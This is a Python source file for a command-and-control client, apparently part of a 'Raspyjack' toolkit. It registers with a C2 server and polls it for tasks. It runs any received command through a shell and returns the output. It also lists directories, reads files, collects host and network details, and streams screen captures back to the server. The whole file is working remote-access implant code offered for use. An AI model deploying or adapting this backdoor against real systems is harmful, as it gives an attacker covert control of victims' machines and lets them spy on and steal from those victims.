import requests
import json
import argparse
import os
import time
import subprocess
import threading
import io

try:
    from PIL import Image
except ImportError:
    Image = None

try:
    import pyscreenshot as ImageGrab
except ImportError:
    ImageGrab = None

C2_URL = "http://127.0.0.1:8000/api"
CONFIG_FILE = "device_config.json"

screencap_thread = None
screencap_stop_event = threading.Event()

def get_device_config(name: str):
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f: config = json.load(f)
        print(f"Device config loaded. ID: {config.get('id')}")
        return config
    try:
        payload = {"name": name}
        response = requests.post(f"{C2_URL}/api/register", json=payload)
        response.raise_for_status()
        config = response.json()
        with open(CONFIG_FILE, 'w') as f: json.dump(config, f, indent=4)
        print(f"Device registered successfully! ID: {config.get('id')}")
        return config
    except requests.exceptions.RequestException as e:
        print(f"Fatal error during registration: {e}")
        return None

def screencap_worker(device_id):
    global screencap_stop_event
    print("Screen capture thread started.")
    while not screencap_stop_event.is_set():
        try:
            # Grab the 128x128 screen content at position (0,0)
            image = ImageGrab.grab(bbox=(0, 0, 128, 128))
            
            img_byte_arr = io.BytesIO()
            image.save(img_byte_arr, format='JPEG')
            
            requests.post(
                f"{C2_URL}/screen/{device_id}",
                data=img_byte_arr.getvalue(),
                headers={'Content-Type': 'image/jpeg'},
                timeout=2
            )
        except Exception as e:
            print(f"Error in screencap_worker: {e}")
        time.sleep(1)
    print("Screen capture thread stopped.")

def start_screencap(device_id):
    global screencap_thread, screencap_stop_event
    if not ImageGrab or not Image:
        print("Cannot start screen capture: Pillow or pyscreenshot library not installed.")
        return
    if screencap_thread is None or not screencap_thread.is_alive():
        screencap_stop_event.clear()
        screencap_thread = threading.Thread(target=screencap_worker, args=(device_id,))
        screencap_thread.daemon = True
        screencap_thread.start()

def stop_screencap():
    global screencap_thread, screencap_stop_event
    if screencap_thread and screencap_thread.is_alive():
        screencap_stop_event.set()
        screencap_thread.join(timeout=5)
        screencap_thread = None

def execute_shell_command(command: str):
    print(f"Executing shell command: '{command}'")
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
        return f"STDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}"
    except Exception as e:
        return f"Execution failed: {str(e)}"

def execute_c2_command(command: str):
    print(f"Executing C2 command: '{command}'")
    parts = command.split(" ", 1)
    cmd_type = parts[0]
    
    if cmd_type == "c2_ls":
        path = parts[1] if len(parts) > 1 else "."
        try:
            if not os.path.isdir(path): return f"Error: '{path}' is not a valid directory."
            items = os.listdir(path)
            output = f"Listing for '{os.path.abspath(path)}':\n\n"
            for item in sorted(items):
                item_path = os.path.join(path, item)
                prefix = "[D]" if os.path.isdir(item_path) else "[F]"
                output += f"{prefix} {item}\n"
            return output
        except Exception as e: return f"Error listing directory: {e}"
    
    elif cmd_type == "c2_read":
        path = parts[1] if len(parts) > 1 else None
        if not path: return "Error: No file path specified for c2_read."
        try:
            if not os.path.isfile(path): return f"Error: '{path}' is not a valid file."
            with open(path, 'r', errors='ignore') as f: content = f.read(10000)
            return f"Content of '{os.path.abspath(path)}':\n\n{content}"
        except Exception as e: return f"Error reading file: {e}"

    elif cmd_type == "c2_get_details":
        try:
            hostname = subprocess.run("hostname", capture_output=True, text=True).stdout.strip()
            uname = subprocess.run("uname -a", shell=True, capture_output=True, text=True).stdout.strip()
            ip_addr = subprocess.run("ip addr", shell=True, capture_output=True, text=True).stdout
            report = (f"--- Device Details ---\n"
                      f"Hostname: {hostname}\n\n"
                      f"OS / Kernel:\n{uname}\n\n"
                      f"Network Interfaces:\n{ip_addr}")
            return report
        except Exception as e:
            return f"Error gathering device details: {e}"

    return f"Unknown C2 command: {cmd_type}"

def submit_result(device_id: str, task_id: int, output: str):
    try:
        payload = {"task_id": task_id, "output": output}
        response = requests.post(f"{C2_URL}/results/{device_id}", json=payload)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error submitting result: {e}")

def main_loop(device_config):
    device_id = device_config.get("id")
    if not device_id: return

    print(f"Starting C2 client for device {device_id}. Polling for commands...")
    while True:
        try:
            tasks = requests.get(f"{C2_URL}/commands/{device_id}").json()
            if tasks:
                for task in tasks:
                    task_id, command = task.get("id"), task.get("command")
                    
                    if command == "c2_screencap_start":
                        start_screencap(device_id)
                        submit_result(device_id, task_id, "Screen capture started.")
                    elif command == "c2_screencap_stop":
                        stop_screencap()
                        submit_result(device_id, task_id, "Screen capture stopped.")
                    elif command.startswith("c2_"):
                        output = execute_c2_command(command)
                        submit_result(device_id, task_id, output)
                    else:
                        output = execute_shell_command(command)
                        submit_result(device_id, task_id, output)
        except Exception as e:
            print(f"Error in main loop: {e}")
        time.sleep(10)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Raspyjack C2 Client")
    parser.add_argument("--name", default="raspy-01", help="A unique name for this device")
    args = parser.parse_args()
    config = get_device_config(args.name)
    if config:
        main_loop(config)
    else:
        print("Could not start client.")
